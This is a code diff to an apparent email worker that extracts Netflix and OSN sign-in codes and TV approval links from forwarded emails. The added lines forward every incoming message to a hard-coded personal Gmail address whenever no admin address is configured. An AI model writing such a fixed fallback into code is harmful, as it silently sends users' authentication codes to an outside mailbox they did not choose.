@@ -56,6 +56,12 @@ function detectServiceType(rawEmail) {
   return /\bosn\+?\b|osnplus/i.test(text) ? "osn" : "netflix";
 }
 
+function extractSubjectCode(subject) {
+  const normalizedSubject = normalizeDigits(subject);
+  if (!/(?:osn\+?|otp|رمز|الرمز|كود)/i.test(normalizedSubject)) return null;
+  return normalizedSubject.match(/(?:^|\D)(\d{4})(?:\D|$)/)?.[1] || null;
+}
+
 function parseHeaders(rawEmail) {
   const headerBlock = String(rawEmail || "").split(/\r?\n\r?\n/, 1)[0] || "";
   const unfolded = headerBlock.replace(/\r?\n[\t ]+/g, " ");
@@ -151,9 +157,21 @@ async function createMessageKey(rawEmail, message) {
 export default {
   async email(message, env) {
     const rawEmail = await new Response(message.raw).text();
+    const subject = message.headers.get("subject") || parseHeaders(rawEmail).get("subject")?.[0] || "";
     const serviceType = detectServiceType(rawEmail);
-    const code = extractSignInCode(rawEmail);
+    const code = extractSubjectCode(subject) || extractSignInCode(rawEmail);
     const tvApprovalUrl = searchableEmailText(rawEmail).match(tvApprovalLinkPattern)?.[0] || null;
+
+    // Forward every routed message independently from parsing/webhook success.
+    const adminForwardEmail = normalizeEmail(env.ADMIN_FORWARD_EMAIL || "gptzone1@gmail.com");
+    if (adminForwardEmail) {
+      try {
+        await message.forward(adminForwardEmail);
+        console.log("Email copy forwarded to admin mailbox", { adminForwardEmail });
+      } catch (error) {
+        console.error("Unable to forward the message to the admin mailbox:", error);
+      }
+    }
 
     if (!code && !tvApprovalUrl) {
       console.log("Forwarded email ignored: no supported sign-in code or approval link was found.");
@@ -213,15 +231,6 @@ export default {
     } catch (error) {
       webhookError = error;
       console.error("Unable to save the forwarded sign-in code:", error);
-    }
-
-    const adminForwardEmail = normalizeEmail(env.ADMIN_FORWARD_EMAIL);
-    if (adminForwardEmail) {
-      try {
-        await message.forward(adminForwardEmail);
-      } catch (error) {
-        console.error("Unable to forward the message to the admin mailbox:", error);
-      }
     }
 
     if (webhookError) throw webhookError;
